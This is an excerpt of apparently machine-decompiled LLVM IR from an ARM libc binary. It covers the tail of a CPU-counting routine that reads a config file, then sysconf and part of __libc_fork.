dec_label_pc_15530:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_15538 = load i32, i32* @r4, align 4
  %v2_15538 = add i32 %v0_15538, -37064
  store i32 %v2_15538, i32* @r8, align 4
  %v2_1553c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1553c, i32* @r7, align 4
  br label %bb18

dec_label_pc_15544:                               ; preds = %bb18
  %v3_15544 = load i32, i32* %stack_var_-36, align 4
  %v1_15548 = inttoptr i32 %v3_15544 to i32*
  %v2_15548 = load i32, i32* %v1_15548, align 4
  %v1_1554c = inttoptr i32 %v2_15548 to i8*
  %v2_1554c = load i8, i8* %v1_1554c, align 1
  %v7_15550 = icmp eq i8 %v2_1554c, 99
  br i1 %v7_15550, label %dec_label_pc_15558, label %.backedge3

dec_label_pc_15558:                               ; preds = %dec_label_pc_15544
  %v1_15558 = add i32 %v2_15548, 1
  %v2_15558 = inttoptr i32 %v1_15558 to i8*
  %v3_15558 = load i8, i8* %v2_15558, align 1
  %v7_1555c = icmp eq i8 %v3_15558, 112
  br i1 %v7_1555c, label %dec_label_pc_15564, label %.backedge3

dec_label_pc_15564:                               ; preds = %dec_label_pc_15558
  %v1_15564 = add i32 %v2_15548, 2
  %v2_15564 = inttoptr i32 %v1_15564 to i8*
  %v3_15564 = load i8, i8* %v2_15564, align 1
  %v7_15568 = icmp eq i8 %v3_15564, 117
  br i1 %v7_15568, label %dec_label_pc_15570, label %.backedge3

dec_label_pc_15570:                               ; preds = %dec_label_pc_15564
  %v1_15570 = add i32 %v2_15548, 3
  %v2_15570 = inttoptr i32 %v1_15570 to i8*
  %v3_15570 = load i8, i8* %v2_15570, align 1
  %v4_15570 = zext i8 %v3_15570 to i32
  %v0_15574 = load i32, i32* @r4, align 4
  %v1_15574 = load i32, i32* @sl, align 4
  %v2_15574 = add i32 %v1_15574, %v0_15574
  %v3_15574 = inttoptr i32 %v2_15574 to i32*
  %v4_15574 = load i32, i32* %v3_15574, align 4
  %v2_15578 = mul nuw nsw i32 %v4_15570, 2
  %v2_1557c = add i32 %v4_15574, %v2_15578
  %v3_1557c = inttoptr i32 %v2_1557c to i16*
  %v4_1557c = load i16, i16* %v3_1557c, align 2
  %v1_15580 = and i16 %v4_1557c, 8
  %v2_15580 = icmp eq i16 %v1_15580, 0
  br i1 %v2_15580, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_15570
  %v1_15584 = load i32, i32* @r5, align 4
  %v2_15584 = add i32 %v1_15584, 1
  store i32 %v2_15584, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_15570, %dec_label_pc_15544, %dec_label_pc_15558, %dec_label_pc_15564
  %v0_15588.pre = load i32, i32* @r6, align 4
  %v0_15594.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_15530
  %v0_15594 = phi i32 [ %v0_15594.pre, %.backedge3 ], [ %v2_15538, %dec_label_pc_15530 ]
  %v0_15588 = phi i32 [ %v0_15588.pre, %.backedge3 ], [ %v1_15524, %dec_label_pc_15530 ]
  %v4_15598 = inttoptr i32 %v0_15588 to i32*
  %v5_15598 = call i32 @__GI_config_read(i32* %v4_15598, i32 %v2_1553c, i32 258, i32 %v0_15594)
  %v2_1559c = icmp eq i32 %v5_15598, 0
  br i1 %v2_1559c, label %dec_label_pc_1560c, label %dec_label_pc_15544

dec_label_pc_155a8:                               ; preds = %entry
  %v0_155ac = load i32, i32* @r4, align 4
  %v2_155ac = add i32 %v0_155ac, -33996
  store i32 %v2_155ac, i32* @r0, align 4
  %v1_155b0 = call i32 @__GI_config_open(i32 %v2_155ac)
  store i32 %v1_155b0, i32* @r6, align 4
  %v2_155b4 = icmp eq i32 %v1_155b0, 0
  br i1 %v2_155b4, label %bb19, label %dec_label_pc_155c0

bb19:                                             ; preds = %dec_label_pc_155a8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1560c

dec_label_pc_155c0:                               ; preds = %dec_label_pc_155a8
  %v0_155c4 = load i32, i32* @r4, align 4
  %v2_155c4 = add i32 %v0_155c4, -33980
  store i32 %v2_155c4, i32* @r8, align 4
  %v2_155cc = add i32 %v0_155c4, -33944
  store i32 %v2_155cc, i32* @r7, align 4
  %v2_155d0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_155d0, i32* @r4, align 4
  br label %bb21

dec_label_pc_155d8:                               ; preds = %bb21
  %v0_15604 = load i32, i32* @r8, align 4
  %v3_155d8 = load i32, i32* %stack_var_-36, align 4
  %v1_155dc = inttoptr i32 %v3_155d8 to i32*
  %v2_155dc = load i32, i32* %v1_155dc, align 4
  store i32 %v2_155dc, i32* @r1, align 4
  %v2_155e0 = inttoptr i32 %v0_15604 to i8*
  %v3_155e0 = call i32 @__GI_strcoll(i8* %v2_155e0, i32 %v2_155dc)
  %v2_155e4 = icmp eq i32 %v3_155e0, 0
  br i1 %v2_155e4, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_155d8
  %v1_155e8 = load i32, i32* @r5, align 4
  %v2_155e8 = add i32 %v1_155e8, 1
  store i32 %v2_155e8, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_155d8
  %v0_155f4.pre = load i32, i32* @r7, align 4
  %v0_155f8.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_155c0
  %v0_155f8 = phi i32 [ %v0_155f8.pre, %.backedge ], [ %v1_155b0, %dec_label_pc_155c0 ]
  %v0_155f4 = phi i32 [ %v0_155f4.pre, %.backedge ], [ %v2_155cc, %dec_label_pc_155c0 ]
  %v4_155fc = inttoptr i32 %v0_155f8 to i32*
  %v5_155fc = call i32 @__GI_config_read(i32* %v4_155fc, i32 %v2_155d0, i32 459266, i32 %v0_155f4)
  %v2_15600 = icmp eq i32 %v5_155fc, 0
  br i1 %v2_15600, label %dec_label_pc_1560c, label %dec_label_pc_155d8

dec_label_pc_1560c:                               ; preds = %bb18, %bb21, %bb19
  %v0_1560c = load i32, i32* @r6, align 4
  %v1_15610 = inttoptr i32 %v0_1560c to i32*
  %v2_15610 = call i32 @__GI_config_close(i32* %v1_15610)
  %v0_15614 = load i32, i32* @r5, align 4
  %v2_15614 = icmp eq i32 %v0_15614, 0
  %.v0_15614 = select i1 %v2_15614, i32 1, i32 %v0_15614
  ret i32 %.v0_15614

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_1560c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_15a40

bb:                                               ; preds = %entry
  %v7_15664 = mul i32 %arg1, 4
  %v8_15664 = add i32 %v7_15664, ptrtoint (i32* @global_var_1566c.911 to i32)
  call void @__pseudo_branch(i32 %v8_15664)
  br label %dec_label_pc_15a40

dec_label_pc_15a40:                               ; preds = %bb, %entry
  %v0_15a44 = call i32 @__aeabi_read_tp()
  %v3_15a48 = load i16, i16* @global_var_244d0.762, align 2
  %v4_15a48 = sext i16 %v3_15a48 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_15a54 = add i32 %v4_15a48, %v0_15a44
  %v4_15a54 = inttoptr i32 %v3_15a54 to i32*
  store i32 22, i32* %v4_15a54, align 4
  %v0_15c38 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_15c38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 13028, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r8.global-to-local, align 4
  %v4_15d6416 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13028) to i32*), align 4
  store i32 %v4_15d6416, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d6818 = icmp eq i32 %v4_15d6416, 0
  br i1 %v2_15d6818, label %dec_label_pc_15d70, label %dec_label_pc_15c94

dec_label_pc_15c94:                               ; preds = %entry, %dec_label_pc_15d64.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_15ca0 = load i32, i32* %r7.global-to-local, align 4
  %v1_15ca0 = add i32 %v0_15ca0, 20
  %v2_15ca0 = inttoptr i32 %v1_15ca0 to i32*
  %v3_15ca0 = load i32, i32* %v2_15ca0, align 4
  store i32 %v3_15ca0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ca4 = icmp eq i32 %v3_15ca0, 0
  store i32 %v3_15ca0, i32* %r4.global-to-local, align 4
  br i1 %v2_15ca4, label %dec_label_pc_15d64.backedge, label %dec_label_pc_15cb4

dec_label_pc_15d64.backedge:                      ; preds = %dec_label_pc_15c94, %dec_label_pc_15ce0
  %v0_15d64 = load i32, i32* %r8.global-to-local, align 4
  %v1_15d64 = load i32, i32* %r5.global-to-local, align 4
  %v2_15d64 = add i32 %v1_15d64, %v0_15d64
  %v3_15d64 = inttoptr i32 %v2_15d64 to i32*
  %v4_15d64 = load i32, i32* %v3_15d64, align 4
  store i32 %v4_15d64, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d68 = icmp eq i32 %v4_15d64, 0
  br i1 %v2_15d68, label %dec_label_pc_15d70, label %dec_label_pc_15c94

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15c94
  %v0_15cb4 = load i32, i32* %r8.global-to-local, align 4
  %v1_15cb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_15cb4 = add i32 %v1_15cb4, %v0_15cb4
  %v3_15cb4 = inttoptr i32 %v2_15cb4 to i32*
  %v4_15cb4 = load i32, i32* %v3_15cb4, align 4
  %v1_15cb8 = add i32 %v4_15cb4, 20
  store i32 %v1_15cb8, i32* %r2.global-to-local, align 4
  %v1_15cbc132 = inttoptr i32 %v1_15cb8 to i32*
  %v2_15cbc133 = load i32, i32* %v1_15cbc132, align 4
  store i32 %v2_15cbc133, i32* %r3.global-to-local, align 4
  %v3_15cc0135 = icmp uge i32 %v2_15cbc133, %v3_15ca0
  store i1 %v3_15cc0135, i1* %cpsr_c.global-to-local, align 1
  %v9_15cc0141 = icmp eq i32 %v2_15cbc133, %v3_15ca0
  br i1 %v9_15cc0141, label %dec_label_pc_15cc8, label %dec_label_pc_15ce0

dec_label_pc_15cc8:                               ; preds = %dec_label_pc_15cb4, %dec_label_pc_15cc8.dec_label_pc_15cbc_crit_edge
  %v0_15cc8142 = phi i32 [ %v1_15cc0.pre, %dec_label_pc_15cc8.dec_label_pc_15cbc_crit_edge ], [ %v3_15ca0, %dec_label_pc_15cb4 ]
  store i32 %v0_15cc8142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15cd8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15cd8, label %dec_label_pc_15cdc, label %dec_label_pc_15cc8.dec_label_pc_15cbc_crit_edge

dec_label_pc_15cc8.dec_label_pc_15cbc_crit_edge:  ; preds = %dec_label_pc_15cc8
  %v0_15cbc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15cc0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15cbc = inttoptr i32 %v0_15cbc.pre to i32*
  %v2_15cbc = load i32, i32* %v1_15cbc, align 4
  store i32 %v2_15cbc, i32* %r3.global-to-local, align 4
  %v3_15cc0 = icmp uge i32 %v2_15cbc, %v1_15cc0.pre
  store i1 %v3_15cc0, i1* %cpsr_c.global-to-local, align 1
  %v9_15cc0 = icmp eq i32 %v2_15cbc, %v1_15cc0.pre
  br i1 %v9_15cc0, label %dec_label_pc_15cc8, label %dec_label_pc_15ce0

dec_label_pc_15cdc:                               ; preds = %dec_label_pc_15cc8
  %v0_15cdc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15cdc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ce0

dec_label_pc_15ce0:                               ; preds = %dec_label_pc_15cb4, %dec_label_pc_15cc8.dec_label_pc_15cbc_crit_edge, %dec_label_pc_15cdc
  %v0_15ce0 = phi i32 [ %v0_15cdc, %dec_label_pc_15cdc ], [ %v2_15cbc133, %dec_label_pc_15cb4 ], [ %v2_15cbc, %dec_label_pc_15cc8.dec_label_pc_15cbc_crit_edge ]
  %v1_15ce0 = phi i32 [ %v0_15cdc, %dec_label_pc_15cdc ], [ %v3_15ca0, %dec_label_pc_15cb4 ], [ %v1_15cc0.pre, %dec_label_pc_15cc8.dec_label_pc_15cbc_crit_edge ]
  %v3_15ce0 = icmp uge i32 %v0_15ce0, %v1_15ce0
  store i1 %v3_15ce0, i1* %cpsr_c.global-to-local, align 1
  %v9_15ce0 = icmp eq i32 %v0_15ce0, %v1_15ce0
  br i1 %v9_15ce0, label %dec_label_pc_15ce8, label %dec_label_pc_15d64.backedge

dec_label_pc_15ce8:                               ; preds = %dec_label_pc_15ce0
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_15cfc = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_15cec

dec_label_pc_15cec:                               ; preds = %dec_label_pc_15d54, %dec_label_pc_15ce8
  %v0_15cec = load i32, i32* %r7.global-to-local, align 4
  %v1_15cec = add i32 %v0_15cec, 4
  %v2_15cec = inttoptr i32 %v1_15cec to i32*
  %v3_15cec = load i32, i32* %v2_15cec, align 4
  store i32 %v3_15cec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15cf0 = icmp eq i32 %v3_15cec, 0
  br i1 %v2_15cf0, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_15cec
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_15cec, %bb
  %v2_15cf8 = xor i1 %v2_15cf0, true
  call void @__pseudo_cond_branch(i1 %v2_15cf8, i32 %v3_15cec)
  %v0_15d00 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15d00, i32* %stack_var_-88, align 4
  %v1_15d04 = inttoptr i32 %v0_15d00 to i32*
  %v2_15d04 = load i32, i32* %v1_15d04, align 4
  store i32 %v2_15d04, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d08 = icmp eq i32 %v2_15d04, 0
  store i32 %v2_15cfc, i32* %r5.global-to-local, align 4
  br i1 %v2_15d08, label %dec_label_pc_15d74.loopexit, label %dec_label_pc_15d1c

dec_label_pc_15d1c:                               ; preds = %bb72
  %v1_15d1c = add i32 %v2_15d04, 20
  store i32 %v1_15d1c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d54.dec_label_pc_15d20_crit_edge, %dec_label_pc_15d1c
  %v0_15d24 = phi i32 [ %v0_15d24.pre, %dec_label_pc_15d54.dec_label_pc_15d20_crit_edge ], [ %v1_15d1c, %dec_label_pc_15d1c ]
  %v0_15d20 = phi i32 [ %v0_15d20.pre, %dec_label_pc_15d54.dec_label_pc_15d20_crit_edge ], [ %v2_15d04, %dec_label_pc_15d1c ]
  %v1_15d20 = add i32 %v0_15d20, 20
  %v2_15d20 = inttoptr i32 %v1_15d20 to i32*
  %v3_15d20 = load i32, i32* %v2_15d20, align 4
  store i32 %v0_15d24, i32* %r2.global-to-local, align 4
  store i32 %v3_15d20, i32* %r4.global-to-local, align 4
  %v1_15d30119 = inttoptr i32 %v0_15d24 to i32*
  %v2_15d30120 = load i32, i32* %v1_15d30119, align 4
  store i32 %v2_15d30120, i32* %r3.global-to-local, align 4
  %v3_15d34122 = icmp uge i32 %v2_15d30120, %v3_15d20
  store i1 %v3_15d34122, i1* %cpsr_c.global-to-local, align 1
  %v9_15d34128 = icmp eq i32 %v2_15d30120, %v3_15d20
  br i1 %v9_15d34128, label %dec_label_pc_15d3c, label %dec_label_pc_15d54

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d20, %dec_label_pc_15d3c.dec_label_pc_15d30_crit_edge
  %v0_15d3c129 = phi i32 [ %v1_15d34.pre, %dec_label_pc_15d3c.dec_label_pc_15d30_crit_edge ], [ %v3_15d20, %dec_label_pc_15d20 ]
  store i32 %v0_15d3c129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d4c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d4c, label %dec_label_pc_15d50, label %dec_label_pc_15d3c.dec_label_pc_15d30_crit_edge

dec_label_pc_15d3c.dec_label_pc_15d30_crit_edge:  ; preds = %dec_label_pc_15d3c
  %v0_15d30.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15d34.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15d30 = inttoptr i32 %v0_15d30.pre to i32*
  %v2_15d30 = load i32, i32* %v1_15d30, align 4
  store i32 %v2_15d30, i32* %r3.global-to-local, align 4
  %v3_15d34 = icmp uge i32 %v2_15d30, %v1_15d34.pre
  store i1 %v3_15d34, i1* %cpsr_c.global-to-local, align 1
  %v9_15d34 = icmp eq i32 %v2_15d30, %v1_15d34.pre
  br i1 %v9_15d34, label %dec_label_pc_15d3c, label %dec_label_pc_15d54

dec_label_pc_15d50:                               ; preds = %dec_label_pc_15d3c
  %v0_15d50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15d50, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d54

dec_label_pc_15d54:                               ; preds = %dec_label_pc_15d20, %dec_label_pc_15d3c.dec_label_pc_15d30_crit_edge, %dec_label_pc_15d50
  %v0_15d54 = phi i32 [ %v0_15d50, %dec_label_pc_15d50 ], [ %v2_15d30120, %dec_label_pc_15d20 ], [ %v2_15d30, %dec_label_pc_15d3c.dec_label_pc_15d30_crit_edge ]
  %v1_15d54 = phi i32 [ %v0_15d50, %dec_label_pc_15d50 ], [ %v3_15d20, %dec_label_pc_15d20 ], [ %v1_15d34.pre, %dec_label_pc_15d3c.dec_label_pc_15d30_crit_edge ]
  %v3_15d54 = icmp uge i32 %v0_15d54, %v1_15d54
  store i1 %v3_15d54, i1* %cpsr_c.global-to-local, align 1
  %v9_15d54 = icmp eq i32 %v0_15d54, %v1_15d54
  store i32 %v2_15cfc, i32* %r4.global-to-local, align 4
  br i1 %v9_15d54, label %dec_label_pc_15cec, label %dec_label_pc_15d54.dec_label_pc_15d20_crit_edge

dec_label_pc_15d54.dec_label_pc_15d20_crit_edge:  ; preds = %dec_label_pc_15d54
  %v0_15d20.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_15d24.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15d20

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d64.backedge, %entry
  %v0_15d7831 = phi i32 [ ptrtoint (i32* @global_var_24478.766 to i32), %entry ], [ %v0_15d64, %dec_label_pc_15d64.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15d74

dec_label_pc_15d74.loopexit:                      ; preds = %bb72
  store i32 %v2_15cfc, i32* %r6.global-to-local, align 4
  %v0_15d78.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15d74

dec_label_pc_15d74:                               ; preds = %dec_label_pc_15d74.loopexit, %dec_label_pc_15d70
  %v0_15d78 = phi i32 [ %v0_15d78.pre, %dec_label_pc_15d74.loopexit ], [ %v0_15d7831, %dec_label_pc_15d70 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15d78 = add i32 %v0_15d78, 152
  %v3_15d78 = inttoptr i32 %v2_15d78 to i32*
  %v4_15d78 = load i32, i32* %v3_15d78, align 4
  store i32 %v4_15d78, i32* %r7.global-to-local, align 4
  %v0_15d7c = call i32 @__aeabi_read_tp()
  store i32 %v0_15d7c, i32* %r0.global-to-local, align 4
  %v1_15d80 = add i32 %v4_15d78, 8
  %v2_15d80 = inttoptr i32 %v1_15d80 to i32*
  %v3_15d80 = load i32, i32* %v2_15d80, align 4
  store i32 %v3_15d80, i32* %r3.global-to-local, align 4
  %v1_15d84 = add i32 %v0_15d7c, -1168
  store i32 %v1_15d84, i32* %r5.global-to-local, align 4
  %v3_15d88 = icmp uge i32 %v3_15d80, %v1_15d84
  store i1 %v3_15d88, i1* %cpsr_c.global-to-local, align 1
  %v9_15d88 = icmp eq i32 %v3_15d80, %v1_15d84
  br i1 %v9_15d88, label %dec_label_pc_15ef0, label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d74
  store i32 %v4_15d78, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15d9c112 = inttoptr i32 %v4_15d78 to i32*
  %v2_15d9c113 = load i32, i32* %v1_15d9c112, align 4
  store i32 %v2_15d9c113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15da0115 = icmp eq i32 %v2_15d9c113, 0
  br i1 %v9_15da0115, label %dec_label_pc_15da8, label %dec_label_pc_15dc0

dec_label_pc_15da8:                               ; preds = %dec_label_pc_15d90, %dec_label_pc_15da8.dec_label_pc_15d9c_crit_edge
  %v0_15da8116 = phi i32 [ %v1_15da0.pre, %dec_label_pc_15da8.dec_label_pc_15d9c_crit_edge ], [ 0, %dec_label_pc_15d90 ]
  store i32 %v0_15da8116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15db8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15db8, label %dec_label_pc_15dbc, label %dec_label_pc_15da8.dec_label_pc_15d9c_crit_edge

dec_label_pc_15da8.dec_label_pc_15d9c_crit_edge:  ; preds = %dec_label_pc_15da8
  %v0_15d9c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15da0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15d9c = inttoptr i32 %v0_15d9c.pre to i32*
  %v2_15d9c = load i32, i32* %v1_15d9c, align 4
  store i32 %v2_15d9c, i32* %r3.global-to-local, align 4
  %v3_15da0 = icmp uge i32 %v2_15d9c, %v1_15da0.pre
  store i1 %v3_15da0, i1* %cpsr_c.global-to-local, align 1
  %v9_15da0 = icmp eq i32 %v2_15d9c, %v1_15da0.pre
  br i1 %v9_15da0, label %dec_label_pc_15da8, label %dec_label_pc_15dc0

dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15da8
  %v0_15dbc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15dbc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15dc0

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15d90, %dec_label_pc_15da8.dec_label_pc_15d9c_crit_edge, %dec_label_pc_15dbc
  %v0_15dc0 = phi i32 [ %v0_15dbc, %dec_label_pc_15dbc ], [ %v2_15d9c113, %dec_label_pc_15d90 ], [ %v2_15d9c, %dec_label_pc_15da8.dec_label_pc_15d9c_crit_edge ]
  %v1_15dc0 = phi i32 [ %v0_15dbc, %dec_label_pc_15dbc ], [ 0, %dec_label_pc_15d90 ], [ %v1_15da0.pre, %dec_label_pc_15da8.dec_label_pc_15d9c_crit_edge ]
  %v3_15dc0 = icmp uge i32 %v0_15dc0, %v1_15dc0
  store i1 %v3_15dc0, i1* %cpsr_c.global-to-local, align 1
  %v9_15dc0 = icmp eq i32 %v0_15dc0, %v1_15dc0
  br i1 %v9_15dc0, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_15dc0
  %v1_15dc4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15dc4, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_15dc0, %bb73
  %v1_15dc8 = xor i1 %v9_15dc0, true
  call void @__pseudo_cond_branch(i1 %v1_15dc8, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_15dcc = load i32, i32* %r5.global-to-local, align 4
  %v1_15dcc = load i32, i32* %r7.global-to-local, align 4
  %v2_15dcc = add i32 %v1_15dcc, 8
  %v3_15dcc = inttoptr i32 %v2_15dcc to i32*
  store i32 %v0_15dcc, i32* %v3_15dcc, align 4
  br label %dec_label_pc_15ef0

dec_label_pc_15ef0:                               ; preds = %bb74, %dec_label_pc_15d74
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15dd4 = load i32, i32* %r8.global-to-local, align 4
  %v2_15dd4 = add i32 %v0_15dd4, 152
  %v3_15dd4 = inttoptr i32 %v2_15dd4 to i32*
  %v4_15dd4 = load i32, i32* %v3_15dd4, align 4
  store i32 %v4_15dd4, i32* %r2.global-to-local, align 4
  %v1_15dd8 = add i32 %v4_15dd4, 4
  %v2_15dd8 = inttoptr i32 %v1_15dd8 to i32*
  %v3_15dd8 = load i32, i32* %v2_15dd8, align 4
  %v1_15ddc = add i32 %v3_15dd8, 1
  store i32 %v1_15ddc, i32* %r3.global-to-local, align 4
  store i32 %v1_15ddc, i32* %v2_15dd8, align 4
  %v0_15de4 = load i32, i32* %r5.global-to-local, align 4
  %v1_15de4 = add i32 %v0_15de4, 108
  %v2_15de4 = inttoptr i32 %v1_15de4 to i32*
  %v3_15de4 = load i32, i32* %v2_15de4, align 4
  store i32 %v3_15de4, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_15dec = sub i32 0, %v3_15de4
  store i32 %v1_15dec, i32* %v2_15de4, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_15e00 = load i32, i32* %r5.global-to-local, align 4
  %v1_15e00 = add i32 %v0_15e00, 104
  store i32 %v1_15e00, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_15ef4.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15ef4 = add i32 %v0_15e00, 108
  %v3_15ef4 = inttoptr i32 %v2_15ef4 to i32*
  store i32 %v0_15ef4.pre, i32* %v3_15ef4, align 4
  %v0_15ef8 = load i32, i32* %r8.global-to-local, align 4
  %v1_15ef8 = load i32, i32* %r3.global-to-local, align 4
  %v2_15ef8 = add i32 %v1_15ef8, %v0_15ef8
  %v3_15ef8 = inttoptr i32 %v2_15ef8 to i32*
  %v4_15ef8 = load i32, i32* %v3_15ef8, align 4
  store i32 %v4_15ef8, i32* %r0.global-to-local, align 4
  %v1_15efc = add i32 %v4_15ef8, 4
  %v2_15efc = inttoptr i32 %v1_15efc to i32*
  %v3_15efc = load i32, i32* %v2_15efc, align 4
  %v1_15f00 = add i32 %v3_15efc, -1
  store i32 %v1_15f00, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f04 = icmp eq i32 %v1_15f00, 0
  store i32 %v1_15f00, i32* %v2_15efc, align 4
  br i1 %v2_15f04, label %dec_label_pc_15f10, label %dec_label_pc_16000thread-pre-split

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15ef0
  %v0_15f10 = load i32, i32* %r3.global-to-local, align 4
  %v1_15f10 = load i32, i32* %r0.global-to-local, align 4
  %v2_15f10 = add i32 %v1_15f10, 8
  %v3_15f10 = inttoptr i32 %v2_15f10 to i32*
  store i32 %v0_15f10, i32* %v3_15f10, align 4
  %v0_15f14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15f14, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15f18

dec_label_pc_15f18:                               ; preds = %dec_label_pc_15f48.dec_label_pc_15f18_crit_edge, %dec_label_pc_15f10
  %v0_15f18 = phi i32 [ %v0_15f18.pre, %dec_label_pc_15f48.dec_label_pc_15f18_crit_edge ], [ %v0_15f14, %dec_label_pc_15f10 ]
  %v1_15f18 = inttoptr i32 %v0_15f18 to i32*
  %v2_15f18 = load i32, i32* %v1_15f18, align 4
  store i32 %v2_15f18, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15f18, i32* %r2.global-to-local, align 4
  %v2_15f24100 = load i32, i32* %v1_15f18, align 4
  store i32 %v2_15f24100, i32* %r3.global-to-local, align 4
  %v3_15f28102 = icmp uge i32 %v2_15f24100, %v2_15f18
  store i1 %v3_15f28102, i1* %cpsr_c.global-to-local, align 1
  %v9_15f28108 = icmp eq i32 %v2_15f24100, %v2_15f18
  br i1 %v9_15f28108, label %dec_label_pc_15f30, label %dec_label_pc_15f48

dec_label_pc_15f30:                               ; preds = %dec_label_pc_15f18, %dec_label_pc_15f30.dec_label_pc_15f24_crit_edge
